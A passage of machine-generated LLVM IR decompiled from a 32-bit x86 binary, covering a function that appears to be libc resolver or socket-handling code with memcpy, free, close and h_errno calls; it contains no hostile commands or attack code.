  store i32 %v3_8053230, i32* %eax.global-to-local, align 4
  %v1_8053233 = load i32, i32* @esp, align 4
  %v2_8053233 = add i32 %v1_8053233, 152
  %v3_8053233 = inttoptr i32 %v2_8053233 to i32*
  store i32 %v3_8053230, i32* %v3_8053233, align 4
  %v0_805323a = load i32, i32* @ecx, align 4
  %v1_805323a = load i32, i32* @esp, align 4
  %v2_805323a = add i32 %v1_805323a, -4
  %v3_805323a = inttoptr i32 %v2_805323a to i32*
  store i32 %v0_805323a, i32* %v3_805323a, align 4
  %v1_805323b = add i32 %v1_805323a, -8
  %v2_805323b = inttoptr i32 %v1_805323b to i32*
  store i32 40, i32* %v2_805323b, align 4
  %v1_805323d = add i32 %v1_805323a, 116
  store i32 %v1_805323d, i32* %edx.global-to-local, align 4
  %v2_8053241 = add i32 %v1_805323a, -12
  %v3_8053241 = inttoptr i32 %v2_8053241 to i32*
  store i32 %v1_805323d, i32* %v3_8053241, align 4
  %v0_8053242 = load i32, i32* @edi, align 4
  %v2_8053242 = add i32 %v1_805323a, -16
  %v3_8053242 = inttoptr i32 %v2_8053242 to i32*
  store i32 %v0_8053242, i32* %v3_8053242, align 4
  %v4_8053243 = call i32 @memcpy(i16* inttoptr (i32 -1 to i16*), i32 %v15_8052e30, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8053243, i32* %eax.global-to-local, align 4
  %v0_8053248 = load i32, i32* @edi, align 4
  %v1_8053248 = add i32 %v0_8053248, 4
  %v2_8053248 = inttoptr i32 %v1_8053248 to i32*
  %v3_8053248 = load i32, i32* %v2_8053248, align 4
  store i32 %v3_8053248, i32* %eax.global-to-local, align 4
  %v0_805324b = load i32, i32* @esp, align 4
  %v1_805324b = add i32 %v0_805324b, 16
  %v9_805324e = icmp eq i32 %v3_8053248, 24
  br i1 %v9_805324e, label %dec_label_pc_805321c.dec_label_pc_8053275_crit_edge, label %dec_label_pc_8053253

dec_label_pc_805321c.dec_label_pc_8053275_crit_edge: ; preds = %dec_label_pc_805321c
  %.pre24 = add i32 %v0_805324b, 260
  %.pre25 = inttoptr i32 %.pre24 to i32*
  %v4_8053275.pre = load i32, i32* %.pre25, align 4
  br label %dec_label_pc_8053275

dec_label_pc_8053253:                             ; preds = %dec_label_pc_805321c
  %v1_8053253 = add i32 %v0_8053248, 28
  %v2_8053253 = inttoptr i32 %v1_8053253 to i32*
  %v3_8053253 = load i32, i32* %v2_8053253, align 4
  %v4_8053253 = icmp eq i32 %v3_8053253, 0
  br i1 %v4_8053253, label %dec_label_pc_8053312, label %dec_label_pc_805325d

dec_label_pc_805325d:                             ; preds = %dec_label_pc_8053253
  %v1_805325d = add i32 %v0_805324b, 260
  %v2_805325d = inttoptr i32 %v1_805325d to i32*
  %v3_805325d = load i32, i32* %v2_805325d, align 4
  %v12_805325d = icmp eq i32 %v3_805325d, 1
  br i1 %v12_805325d, label %dec_label_pc_8053275, label %dec_label_pc_8053267

dec_label_pc_8053267:                             ; preds = %dec_label_pc_805325d
  %v12_8053267 = icmp eq i32 %v3_805325d, 28
  %v1_805326f = icmp eq i1 %v12_8053267, false
  br i1 %v1_805326f, label %dec_label_pc_8053312, label %dec_label_pc_8053275

dec_label_pc_8053275:                             ; preds = %dec_label_pc_805321c.dec_label_pc_8053275_crit_edge, %dec_label_pc_8053267, %dec_label_pc_805325d
  %v4_8053275 = phi i32 [ %v4_8053275.pre, %dec_label_pc_805321c.dec_label_pc_8053275_crit_edge ], [ %v3_805325d, %dec_label_pc_8053267 ], [ %v3_805325d, %dec_label_pc_805325d ]
  %v15_8053275 = icmp eq i32 %v3_8053248, %v4_8053275
  br i1 %v15_8053275, label %dec_label_pc_805328a, label %dec_label_pc_805327e

dec_label_pc_805327e:                             ; preds = %dec_label_pc_8053275
  %v1_8053281 = inttoptr i32 %v0_8053248 to i32*
  %v2_8053281 = load i32, i32* %v1_8053281, align 4
  %v5_8053281 = inttoptr i32 %v0_805324b to i32*
  store i32 %v2_8053281, i32* %v5_8053281, align 4
  %v1_8053283 = call i32 @free(i32 -1)
  store i32 %v1_8053283, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80532fa

dec_label_pc_805328a:                             ; preds = %dec_label_pc_8053275
  %v0_805328a = load i32, i32* @ebx, align 4
  %v1_805328c = sub i32 -1, %v0_805328a
  store i32 %v1_805328c, i32* %eax.global-to-local, align 4
  %v2_805328e = add i32 %v0_805324b, 120
  %v3_805328e = inttoptr i32 %v2_805328e to i32*
  %v4_805328e = load i32, i32* %v3_805328e, align 4
  %v5_805328e = add i32 %v4_805328e, %v1_805328c
  store i32 %v5_805328e, i32* %eax.global-to-local, align 4
  %v2_8053292 = add i32 %v0_8053248, 36
  %v3_8053292 = inttoptr i32 %v2_8053292 to i32*
  store i32 %v5_805328e, i32* %v3_8053292, align 4
  %v0_8053295 = load i32, i32* @edi, align 4
  %v1_8053295 = add i32 %v0_8053295, 16
  %v2_8053295 = inttoptr i32 %v1_8053295 to i32*
  %v3_8053295 = load i32, i32* %v2_8053295, align 4
  %v1_8053298 = add i32 %v3_8053295, 4
  store i32 %v1_8053298, i32* %eax.global-to-local, align 4
  %v2_805329b = add i32 %v0_8053295, 36
  %v3_805329b = inttoptr i32 %v2_805329b to i32*
  %v4_805329b = load i32, i32* %v3_805329b, align 4
  %v7_805329b = mul i32 %v4_805329b, %v1_8053298
  store i32 %v7_805329b, i32* %eax.global-to-local, align 4
  %v2_805329f = add i32 %v0_8053295, 32
  %v3_805329f = inttoptr i32 %v2_805329f to i32*
  %v4_805329f = load i32, i32* %v3_805329f, align 4
  %v6_80532a2 = icmp ugt i32 %v7_805329b, %v4_805329f
  br i1 %v6_80532a2, label %dec_label_pc_805328a.dec_label_pc_8053312.loopexit_crit_edge, label %dec_label_pc_80532a4

dec_label_pc_805328a.dec_label_pc_8053312.loopexit_crit_edge: ; preds = %dec_label_pc_805328a
  %v0_8053312.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8053312

dec_label_pc_80532a4:                             ; preds = %dec_label_pc_805328a
  store i32 0, i32* %v3_805329b, align 4
  %v0_80532ab = load i32, i32* @esp, align 4
  %v1_80532ab = add i32 %v0_80532ab, 27
  %v2_80532ab = inttoptr i32 %v1_80532ab to i8*
  store i8 0, i8* %v2_80532ab, align 1
  %v1_80532fd.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80532fd

dec_label_pc_80532b2:                             ; preds = %dec_label_pc_8053211
  %v1_80532b5 = add i32 %v0_80531f2, 132
  %v2_80532b5 = inttoptr i32 %v1_80532b5 to i32*
  %v3_80532b5 = load i32, i32* %v2_80532b5, align 4
  %v6_80532b5 = inttoptr i32 %v0_80531f2 to i32*
  store i32 %v3_80532b5, i32* %v6_80532b5, align 4
  %v1_80532bc = call i32 @free(i32 -1)
  store i32 %v1_80532bc, i32* %eax.global-to-local, align 4
  %v0_80532c1 = load i32, i32* @esp, align 4
  %v1_80532c1 = add i32 %v0_80532c1, 16
  %v1_80532c4 = add i32 %v0_80532c1, 260
  %v2_80532c4 = inttoptr i32 %v1_80532c4 to i32*
  %v3_80532c4 = load i32, i32* %v2_80532c4, align 4
  store i32 %v3_80532c4, i32* %eax.global-to-local, align 4
  %v1_80532cb = add i32 %v0_80532c1, 136
  %v2_80532cb = inttoptr i32 %v1_80532cb to i32*
  %v3_80532cb = load i32, i32* %v2_80532cb, align 4
  %v15_80532cb = icmp eq i32 %v3_80532cb, %v3_80532c4
  %v1_80532cf = icmp eq i1 %v15_80532cb, false
  br i1 %v1_80532cf, label %dec_label_pc_80532fd, label %dec_label_pc_80532d1

dec_label_pc_80532d1:                             ; preds = %dec_label_pc_80532b2
  %v0_80532d1 = load i32, i32* @edi, align 4
  %v1_80532d1 = add i32 %v0_80532d1, 16
  %v2_80532d1 = inttoptr i32 %v1_80532d1 to i32*
  %v3_80532d1 = load i32, i32* %v2_80532d1, align 4
  store i32 %v3_80532d1, i32* %eax.global-to-local, align 4
  %v2_80532d4 = add i32 %v0_80532c1, 148
  %v3_80532d4 = inttoptr i32 %v2_80532d4 to i32*
  %v4_80532d4 = load i32, i32* %v3_80532d4, align 4
  %v15_80532d4 = icmp eq i32 %v3_80532d1, %v4_80532d4
  %v1_80532db = icmp eq i1 %v15_80532d4, false
  br i1 %v1_80532db, label %dec_label_pc_8053397, label %dec_label_pc_80532e1

dec_label_pc_80532e1:                             ; preds = %dec_label_pc_80532d1
  %v0_80532e1 = load i32, i32* @edx, align 4
  %v2_80532e1 = add i32 %v0_80532c1, 12
  %v3_80532e1 = inttoptr i32 %v2_80532e1 to i32*
  store i32 %v0_80532e1, i32* %v3_80532e1, align 4
  %v0_80532e2 = load i32, i32* %eax.global-to-local, align 4
  %v2_80532e2 = add i32 %v0_80532c1, 8
  %v3_80532e2 = inttoptr i32 %v2_80532e2 to i32*
  store i32 %v0_80532e2, i32* %v3_80532e2, align 4
  %v1_80532e3 = add i32 %v0_80532c1, 152
  %v2_80532e3 = inttoptr i32 %v1_80532e3 to i32*
  %v3_80532e3 = load i32, i32* %v2_80532e3, align 4
  %v5_80532e3 = add i32 %v0_80532c1, 4
  %v6_80532e3 = inttoptr i32 %v5_80532e3 to i32*
  store i32 %v3_80532e3, i32* %v6_80532e3, align 4
  %v0_80532ea = load i32, i32* %eax.global-to-local, align 4
  %v1_80532ea = load i32, i32* @edi, align 4
  %v2_80532ea = add i32 %v1_80532ea, 36
  %v3_80532ea = inttoptr i32 %v2_80532ea to i32*
  %v4_80532ea = load i32, i32* %v3_80532ea, align 4
  %v7_80532ea = mul i32 %v4_80532ea, %v0_80532ea
  store i32 %v7_80532ea, i32* %eax.global-to-local, align 4
  %v2_80532ee = add i32 %v1_80532ea, 28
  %v3_80532ee = inttoptr i32 %v2_80532ee to i32*
  %v4_80532ee = load i32, i32* %v3_80532ee, align 4
  %v5_80532ee = add i32 %v4_80532ee, %v7_80532ea
  store i32 %v5_80532ee, i32* %eax.global-to-local, align 4
  %v3_80532f1 = inttoptr i32 %v0_80532c1 to i32*
  store i32 %v5_80532ee, i32* %v3_80532f1, align 4
  %v4_80532f2 = call i32 @memcpy(i16* inttoptr (i32 -1 to i16*), i32 %v15_8052e30, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80532f2, i32* %eax.global-to-local, align 4
  %v0_80532f7 = load i32, i32* @edi, align 4
  %v1_80532f7 = add i32 %v0_80532f7, 36
  %v2_80532f7 = inttoptr i32 %v1_80532f7 to i32*
  %v3_80532f7 = load i32, i32* %v2_80532f7, align 4
  %v4_80532f7 = add i32 %v3_80532f7, 1
  store i32 %v4_80532f7, i32* %v2_80532f7, align 4
  br label %dec_label_pc_80532fa

dec_label_pc_80532fa:                             ; preds = %dec_label_pc_805327e, %dec_label_pc_80532e1
  %v0_80532fa = load i32, i32* @esp, align 4
  %v1_80532fa = add i32 %v0_80532fa, 16
  br label %dec_label_pc_80532fd

dec_label_pc_80532fd:                             ; preds = %dec_label_pc_80532b2, %dec_label_pc_80532a4, %dec_label_pc_80532fa
  %v1_80532fd = phi i32 [ %v1_80532c1, %dec_label_pc_80532b2 ], [ %v1_80532fd.pre, %dec_label_pc_80532a4 ], [ %v1_80532fa, %dec_label_pc_80532fa ]
  %v0_80532fd = load i32, i32* @esi, align 4
  %v2_80532fd = add i32 %v1_80532fd, 52
  %v3_80532fd = inttoptr i32 %v2_80532fd to i32*
  %v4_80532fd = load i32, i32* %v3_80532fd, align 4
  %v5_80532fd = add i32 %v4_80532fd, %v0_80532fd
  store i32 %v5_80532fd, i32* @esi, align 4
  %v0_8053301 = load i32, i32* @ebx, align 4
  %v1_8053301 = add i32 %v0_8053301, 1
  store i32 %v1_8053301, i32* @ebx, align 4
  %v2_8053302 = add i32 %v1_80532fd, 104
  %v3_8053302 = inttoptr i32 %v2_8053302 to i32*
  %v4_8053302 = load i32, i32* %v3_8053302, align 4
  %v5_8053302 = sub i32 %v1_8053301, %v4_8053302
  %v11_8053302 = xor i32 %v4_8053302, %v1_8053301
  %v12_8053302 = xor i32 %v5_8053302, %v1_8053301
  %v13_8053302 = and i32 %v12_8053302, %v11_8053302
  %v14_8053302 = icmp slt i32 %v13_8053302, 0
  %v16_8053302 = icmp slt i32 %v5_8053302, 0
  %v2_8053306 = icmp eq i1 %v16_8053302, %v14_8053302
  br i1 %v2_8053306, label %dec_label_pc_8053312, label %dec_label_pc_8053308

dec_label_pc_8053308:                             ; preds = %dec_label_pc_8053308.lr.ph, %dec_label_pc_80532fd
  %v0_8053308 = phi i32 [ %v0_8053308.pre, %dec_label_pc_8053308.lr.ph ], [ %v5_80532fd, %dec_label_pc_80532fd ]
  %v0_80531de67 = phi i32 [ %v1_8053302.pre, %dec_label_pc_8053308.lr.ph ], [ %v1_80532fd, %dec_label_pc_80532fd ]
  %v2_8053308 = add i32 %v0_80531de67, 16
  %v3_8053308 = inttoptr i32 %v2_8053308 to i32*
  %v4_8053308 = load i32, i32* %v3_8053308, align 4
  %v5_8053308 = sub i32 %v0_8053308, %v4_8053308
  %v11_8053308 = xor i32 %v4_8053308, %v0_8053308
  %v12_8053308 = xor i32 %v5_8053308, %v0_8053308
  %v13_8053308 = and i32 %v12_8053308, %v11_8053308
  %v14_8053308 = icmp slt i32 %v13_8053308, 0
  %v16_8053308 = icmp slt i32 %v5_8053308, 0
  %v2_805330c = icmp eq i1 %v16_8053308, %v14_8053308
  br i1 %v2_805330c, label %dec_label_pc_8053312, label %dec_label_pc_80531de

dec_label_pc_8053312:                             ; preds = %dec_label_pc_8053201, %dec_label_pc_80531d2, %dec_label_pc_80532fd, %dec_label_pc_8053253, %dec_label_pc_8053267, %dec_label_pc_8053308, %dec_label_pc_805328a.dec_label_pc_8053312.loopexit_crit_edge
  %v0_8053312 = phi i32 [ %v0_8053312.pre.pre, %dec_label_pc_805328a.dec_label_pc_8053312.loopexit_crit_edge ], [ %v1_8053302.pre, %dec_label_pc_80531d2 ], [ %v1_80532fd, %dec_label_pc_80532fd ], [ %v1_805324b, %dec_label_pc_8053253 ], [ %v1_805324b, %dec_label_pc_8053267 ], [ %v0_80531de67, %dec_label_pc_8053308 ], [ %v1_80531f2, %dec_label_pc_8053201 ]
  %v1_8053315 = add i32 %v0_8053312, 20
  %v2_8053315 = inttoptr i32 %v1_8053315 to i32*
  %v3_8053315 = load i32, i32* %v2_8053315, align 4
  %v5_8053315 = add i32 %v0_8053312, -16
  %v6_8053315 = inttoptr i32 %v5_8053315 to i32*
  store i32 %v3_8053315, i32* %v6_8053315, align 4
  %v1_8053319 = call i32 @__libc_close(i32 -1)
  store i32 %v1_8053319, i32* %eax.global-to-local, align 4
  %v0_805331e = load i32, i32* @esp, align 4
  %v1_8053321 = add i32 %v0_805331e, 272
  %v2_8053321 = inttoptr i32 %v1_8053321 to i32*
  %v3_8053321 = load i32, i32* %v2_8053321, align 4
  %v4_8053321 = icmp eq i32 %v3_8053321, 0
  br i1 %v4_8053321, label %dec_label_pc_8053336, label %dec_label_pc_805332b

dec_label_pc_805332b:                             ; preds = %dec_label_pc_8053312
  store i32 %v3_8053321, i32* %edx.global-to-local, align 4
  %v2_8053332 = inttoptr i32 %v3_8053321 to i32*
  store i32 %v2_8052da2, i32* %v2_8053332, align 4
  %v0_8053342.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8053342

dec_label_pc_8053336:                             ; preds = %dec_label_pc_8053312
  %v3_8053339 = inttoptr i32 %v0_805331e to i32*
  store i32 %v2_8052da2, i32* %v3_8053339, align 4
  %v1_805333a = call i32 @free(i32 -1)
  store i32 %v1_805333a, i32* %eax.global-to-local, align 4
  %v0_805333f = load i32, i32* @esp, align 4
  %v1_805333f = add i32 %v0_805333f, 16
  br label %dec_label_pc_8053342

dec_label_pc_8053342:                             ; preds = %dec_label_pc_805332b, %dec_label_pc_8053336
  %v0_8053342 = phi i32 [ %v0_8053342.pre, %dec_label_pc_805332b ], [ %v1_805333f, %dec_label_pc_8053336 ]
  %v1_8053345 = add i32 %v0_8053342, 12
  %v2_8053345 = inttoptr i32 %v1_8053345 to i32*
  %v3_8053345 = load i32, i32* %v2_8053345, align 4
  %v5_8053345 = add i32 %v0_8053342, -16
  %v6_8053345 = inttoptr i32 %v5_8053345 to i32*
  store i32 %v3_8053345, i32* %v6_8053345, align 4
  %v1_8053349 = call i32 @free(i32 -1)
  store i32 %v1_8053349, i32* @eax, align 4
  %v0_805334e = load i32, i32* @esp, align 4
  %v1_8053351 = add i32 %v0_805334e, 8
  %v2_8053351 = inttoptr i32 %v1_8053351 to i32*
  store i32 ptrtoint (i8** @global_var_805e728.231 to i32), i32* %v2_8053351, align 4
  %v1_8053356 = add i32 %v0_805334e, 4
  %v2_8053356 = inttoptr i32 %v1_8053356 to i32*
  store i32 134552147, i32* %v2_8053356, align 4
  %v1_805335b = add i32 %v0_805334e, 200
  store i32 %v1_805335b, i32* %ebx.global-to-local, align 4
  %v3_8053362 = inttoptr i32 %v0_805334e to i32*
  store i32 %v1_805335b, i32* %v3_8053362, align 4
  %v2_8053363 = call i32 @__pthread_return_void(i32 -1, i32 %v15_8052e30)
  store i32 %v2_8053363, i32* %eax.global-to-local, align 4
  %v0_8053368 = load i32, i32* @esp, align 4
  %v1_8053368 = inttoptr i32 %v0_8053368 to i32*
  store i32 ptrtoint (i8** @global_var_805e728.231 to i32), i32* %v1_8053368, align 4
  %v1_805336f = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_805336f, i32* %eax.global-to-local, align 4
  %v0_8053374 = load i32, i32* @esp, align 4
  %v1_8053374 = add i32 %v0_8053374, 56
  %v2_8053374 = inttoptr i32 %v1_8053374 to i32*
  %v3_8053374 = load i32, i32* %v2_8053374, align 4
  store i32 %v3_8053374, i32* @eax, align 4
  %v1_8053378 = add i32 %v0_8053374, 60
  %v2_8053378 = inttoptr i32 %v1_8053378 to i32*
  %v3_8053378 = load i32, i32* %v2_8053378, align 4
  store i32 %v3_8053378, i32* %edx.global-to-local, align 4
  %v1_805337c = inttoptr i32 %v0_8053374 to i32*
  %v3_805337c = add i32 %v0_8053374, 4
  %v1_805337d = inttoptr i32 %v3_805337c to i32*
  %v1_805337e = sext i32 %v3_8053374 to i64
  store i64 %v1_805337e, i64* @global_var_805e740.232, align 64
  %v1_8053383 = trunc i32 %v3_8053378 to i16
  store i16 %v1_8053383, i16* @global_var_8058484.233, align 4
  store i32 1, i32* %v1_805337d, align 4
  %v0_805338c = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_805338c, i32* %v1_805337c, align 4
  %v2_805338d = call i32 @__pthread_return_void(i32 -1, i32 %v15_8052e30)
  store i32 %v2_805338d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80534ce

dec_label_pc_8053397:                             ; preds = %dec_label_pc_80532d1
  %v1_805339a = inttoptr i32 %v0_80532d1 to i32*
  %v2_805339a = load i32, i32* %v1_805339a, align 4
  %v5_805339a = inttoptr i32 %v0_80532c1 to i32*
  store i32 %v2_805339a, i32* %v5_805339a, align 4
  %v1_805339c = call i32 @free(i32 -1)
  store i32 %v1_805339c, i32* @eax, align 4
  %v0_80533a1 = load i32, i32* @esp, align 4
  %v1_80533a1 = add i32 %v0_80533a1, 16
  br label %dec_label_pc_80533a4

dec_label_pc_80533a4:                             ; preds = %dec_label_pc_80530d6, %dec_label_pc_8053201, %dec_label_pc_80531f9, %dec_label_pc_8053195, %dec_label_pc_805311b, %dec_label_pc_80530f7, %dec_label_pc_8053397
  %v1_80533ab = phi i32 [ %v1_80530eb, %dec_label_pc_80530d6 ], [ %v1_80531f2, %dec_label_pc_8053201 ], [ %v1_80531f2, %dec_label_pc_80531f9 ], [ %v1_805310c, %dec_label_pc_8053195 ], [ %v1_805310c, %dec_label_pc_805311b ], [ %v1_805310c, %dec_label_pc_80530f7 ], [ %v1_80533a1, %dec_label_pc_8053397 ]
  %v1_80533a4 = add i32 %v1_80533ab, 51
  %v2_80533a4 = inttoptr i32 %v1_80533a4 to i8*
  %v3_80533a4 = load i8, i8* %v2_80533a4, align 1
  %v4_80533a4 = icmp eq i8 %v3_80533a4, 0
  %v1_80533a9 = icmp eq i1 %v4_80533a4, false
  br i1 %v1_80533a9, label %dec_label_pc_80533ef, label %dec_label_pc_80533ab

dec_label_pc_80533ab:                             ; preds = %dec_label_pc_80533a4
  %v0_80533ab = load i32, i32* @ecx, align 4
  %v2_80533ab = add i32 %v1_80533ab, -4
  %v3_80533ab = inttoptr i32 %v2_80533ab to i32*
  store i32 %v0_80533ab, i32* %v3_80533ab, align 4
  %v1_80533ac = add i32 %v1_80533ab, -8
  %v2_80533ac = inttoptr i32 %v1_80533ac to i32*
  store i32 ptrtoint (i32* @global_var_8058488.173 to i32), i32* %v2_80533ac, align 4
  %v1_80533b1 = add i32 %v1_80533ab, -12
  %v2_80533b1 = inttoptr i32 %v1_80533b1 to i32*
  store i32 134552147, i32* %v2_80533b1, align 4
  %v1_80533b6 = add i32 %v1_80533ab, 184
  store i32 %v1_80533b6, i32* @esi, align 4
  %v2_80533bd = add i32 %v1_80533ab, -16
  %v3_80533bd = inttoptr i32 %v2_80533bd to i32*
  store i32 %v1_80533b6, i32* %v3_80533bd, align 4
  %v2_80533be = call i32 @__pthread_return_void(i32 -1, i32 %v15_8052e30)
  store i32 %v2_80533be, i32* %eax.global-to-local, align 4
  %v0_80533c3 = load i32, i32* @esp, align 4
  %v1_80533c3 = inttoptr i32 %v0_80533c3 to i32*
  store i32 ptrtoint (i32* @global_var_8058488.173 to i32), i32* %v1_80533c3, align 4
  %v1_80533ca = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_80533ca, i32* %eax.global-to-local, align 4
  %v0_80533cf = load i32, i32* @global_var_805eb78.234, align 8
  store i32 %v0_80533cf, i32* %ebx.global-to-local, align 4
  %v0_80533d5 = load i32, i32* @esp, align 4
  %v1_80533d5 = inttoptr i32 %v0_80533d5 to i32*
  %v2_80533d5 = load i32, i32* %v1_80533d5, align 4
  store i32 %v2_80533d5, i32* @eax, align 4
  %v3_80533d5 = add i32 %v0_80533d5, 4
  %v1_80533d6 = inttoptr i32 %v3_80533d5 to i32*
  %v2_80533d6 = load i32, i32* %v1_80533d6, align 4
  store i32 %v2_80533d6, i32* %edx.global-to-local, align 4
  %v1_80533d7 = add i32 %v0_80533cf, -1
  store i32 %v1_80533d7, i32* @ebx, align 4
  store i32 1, i32* %v1_80533d6, align 4
  %v0_80533da = load i32, i32* @esi, align 4
  store i32 %v0_80533da, i32* %v1_80533d5, align 4
  %v2_80533db = call i32 @__pthread_return_void(i32 -1, i32 %v15_8052e30)
  store i32 %v2_80533db, i32* %eax.global-to-local, align 4
  %v0_80533e0 = load i32, i32* @esp, align 4
  %v1_80533e0 = add i32 %v0_80533e0, 16
  %v1_80533e3 = add i32 %v0_80533e0, 52
  %v2_80533e3 = inttoptr i32 %v1_80533e3 to i32*
  %v3_80533e3 = load i32, i32* %v2_80533e3, align 4
  %v4_80533e3 = load i32, i32* @ebx, align 4
  %v5_80533e3 = sub i32 %v3_80533e3, %v4_80533e3
  %v11_80533e3 = xor i32 %v4_80533e3, %v3_80533e3
  %v12_80533e3 = xor i32 %v5_80533e3, %v3_80533e3
  %v13_80533e3 = and i32 %v12_80533e3, %v11_80533e3
  %v14_80533e3 = icmp slt i32 %v13_80533e3, 0
  %v16_80533e3 = icmp slt i32 %v5_80533e3, 0
  %v2_80533e7 = icmp eq i1 %v16_80533e3, %v14_80533e3
  br i1 %v2_80533e7, label %dec_label_pc_80533ef, label %dec_label_pc_80533e9

dec_label_pc_80533e9:                             ; preds = %dec_label_pc_80533ab
  %v4_80533e9 = add i32 %v3_80533e3, 1
  store i32 %v4_80533e9, i32* %v2_80533e3, align 4
  br label %dec_label_pc_8053410.backedge

dec_label_pc_80533ef:                             ; preds = %dec_label_pc_8053078, %dec_label_pc_80533ab, %dec_label_pc_80533a4, %dec_label_pc_805308f
  %v1_80533fe = phi i32 [ %v1_80533e0, %dec_label_pc_80533ab ], [ %v1_80533ab, %dec_label_pc_80533a4 ], [ %v1_80530cb, %dec_label_pc_805308f ], [ %v0_80533ef.pre, %dec_label_pc_8053078 ]
  %v1_80533ef = add i32 %v1_80533fe, 40
  %v2_80533ef = inttoptr i32 %v1_80533ef to i32*
  %v3_80533ef = load i32, i32* %v2_80533ef, align 4
  %v1_80533f3 = add i32 %v3_80533ef, 1
  store i32 %v1_80533f3, i32* %eax.global-to-local, align 4
  %v1_80533f4 = ashr i32 %v1_80533f3, 31
  store i32 %v1_80533f4, i32* %edx.global-to-local, align 4
  %v1_80533f5 = add i32 %v1_80533fe, 248
  %v2_80533f5 = inttoptr i32 %v1_80533f5 to i32*
  %v3_80533f5 = load i32, i32* %v2_80533f5, align 4
  %v5_80533f5 = zext i32 %v1_80533f3 to i64
  %v7_80533f5 = zext i32 %v1_80533f4 to i64
  %v8_80533f5 = mul nuw i64 %v7_80533f5, 4294967296
  %v9_80533f5 = or i64 %v8_80533f5, %v5_80533f5
  %v10_80533f5 = zext i32 %v3_80533f5 to i64
  %v11_80533f5 = sdiv i64 %v9_80533f5, %v10_80533f5
  %v12_80533f5 = trunc i64 %v11_80533f5 to i32
  store i32 %v12_80533f5, i32* %eax.global-to-local, align 4
  %v13_80533f5 = srem i64 %v9_80533f5, %v10_80533f5
  %v14_80533f5 = trunc i64 %v13_80533f5 to i32
  store i32 %v14_80533f5, i32* %edx.global-to-local, align 4
  %v1_80533fc = icmp eq i32 %v14_80533f5, 0
  store i32 %v14_80533f5, i32* %v2_80533ef, align 4
  %v1_8053402 = icmp eq i1 %v1_80533fc, false
  br i1 %v1_8053402, label %dec_label_pc_8053408, label %dec_label_pc_8053404

dec_label_pc_8053404:                             ; preds = %dec_label_pc_80533ef
  %v0_8053404 = load i32, i32* @esp, align 4
  %v1_8053404 = add i32 %v0_8053404, 28
  %v2_8053404 = inttoptr i32 %v1_8053404 to i32*
  %v3_8053404 = load i32, i32* %v2_8053404, align 4
  %v4_8053404 = add i32 %v3_8053404, 1
  store i32 %v4_8053404, i32* %v2_8053404, align 4
  br label %dec_label_pc_8053408

dec_label_pc_8053408:                             ; preds = %dec_label_pc_80533ef, %dec_label_pc_8053404
  %v0_8053408 = load i32, i32* @esp, align 4
  %v1_8053408 = add i32 %v0_8053408, 36
  %v2_8053408 = inttoptr i32 %v1_8053408 to i32*
  store i32 -1, i32* %v2_8053408, align 4
  br label %dec_label_pc_8053410.backedge

dec_label_pc_8053410.backedge:                    ; preds = %dec_label_pc_8053408, %dec_label_pc_8053086, %dec_label_pc_8053174, %dec_label_pc_80533e9
  %v0_8053410.pre = load i32, i32* @esp, align 4
  %v1_8053410 = add i32 %v0_8053410.pre, 28
  %v2_8053410 = inttoptr i32 %v1_8053410 to i32*
  %v3_8053410 = load i32, i32* %v2_8053410, align 4
  %tmp110 = icmp ult i32 %v3_8053410, 3
  br i1 %tmp110, label %dec_label_pc_8052e70, label %dec_label_pc_8053435

dec_label_pc_8053435:                             ; preds = %dec_label_pc_8052dea, %dec_label_pc_8052e86, %dec_label_pc_8052f7a, %dec_label_pc_8053410.backedge, %entry, %dec_label_pc_8052dc4, %dec_label_pc_8052dcc, %dec_label_pc_8052dda
  %stack_var_-180.0 = phi i16 [ -1, %dec_label_pc_8052dda ], [ -1, %dec_label_pc_8052dcc ], [ -1, %dec_label_pc_8052dc4 ], [ -1, %entry ], [ %v0_8052e37, %dec_label_pc_8053410.backedge ], [ %v0_8052e37, %dec_label_pc_8052f7a ], [ %v0_8052e37, %dec_label_pc_8052e86 ], [ %v0_8052e37, %dec_label_pc_8052dea ]
  %v0_8053435 = call i32 @__GI___h_errno_location()
  store i32 %v0_8053435, i32* %eax.global-to-local, align 4
  %v1_805343a = inttoptr i32 %v0_8053435 to i32*
  store i32 -1, i32* %v1_805343a, align 4
  %v0_8053440 = load i32, i32* @esp, align 4
  %v1_8053440 = add i32 %v0_8053440, 56
  %v2_8053440 = inttoptr i32 %v1_8053440 to i32*
  %v3_8053440 = load i32, i32* %v2_8053440, align 4
  store i32 %v3_8053440, i32* %eax.global-to-local, align 4
  %v2_8053444 = add i32 %v0_8053440, 44
  %v3_8053444 = inttoptr i32 %v2_8053444 to i32*
  store i32 %v3_8053440, i32* %v3_8053444, align 4
  br label %dec_label_pc_8053448

dec_label_pc_8053448:                             ; preds = %dec_label_pc_80531ad, %dec_label_pc_8053185, %dec_label_pc_8053435
  %stack_var_-180.1 = phi i16 [ %stack_var_-180.0, %dec_label_pc_8053435 ], [ %v0_8052e37, %dec_label_pc_80531ad ], [ %v0_8052e37, %dec_label_pc_8053185 ]
  %v0_8053448 = load i32, i32* @esp, align 4
  %v1_8053448 = add i32 %v0_8053448, 20
  %v2_8053448 = inttoptr i32 %v1_8053448 to i32*
  %v3_8053448 = load i32, i32* %v2_8053448, align 4
  %v13_8053448 = icmp eq i32 %v3_8053448, -1
  br i1 %v13_8053448, label %dec_label_pc_8053448.dec_label_pc_805345e_crit_edge, label %dec_label_pc_805344f

dec_label_pc_8053448.dec_label_pc_805345e_crit_edge: ; preds = %dec_label_pc_8053448
  %.pre = sext i16 %stack_var_-180.1 to i32
  br label %dec_label_pc_805345e

dec_label_pc_805344f:                             ; preds = %dec_label_pc_8053448
  %v3_8053452 = load i32, i32* %v2_8053448, align 4
  %v5_8053452 = add i32 %v0_8053448, -16
  %v6_8053452 = inttoptr i32 %v5_8053452 to i32*
  store i32 %v3_8053452, i32* %v6_8053452, align 4
  %v1_8053456 = sext i16 %stack_var_-180.1 to i32
  %v2_8053456 = call i32 @__libc_close(i32 %v1_8053456)
  store i32 %v2_8053456, i32* %eax.global-to-local, align 4
  %v0_805345b = load i32, i32* @esp, align 4
  %v1_805345b = add i32 %v0_805345b, 16
